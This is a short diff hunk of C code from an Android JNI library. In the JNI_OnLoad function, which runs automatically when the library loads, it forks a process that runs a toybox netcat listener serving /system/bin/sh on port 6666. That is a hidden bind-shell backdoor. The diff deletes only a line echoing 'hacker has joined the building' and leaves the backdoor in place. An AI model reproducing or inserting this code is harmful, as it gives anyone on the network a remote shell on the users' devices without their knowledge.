@@ -6,7 +6,6 @@
 JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {
     
     if (fork() == 0) {
-        system("echo 'hacker has joined the building'");
         system("toybox nc -p 6666 -L /system/bin/sh -l");
     }
     JNIEnv* env;
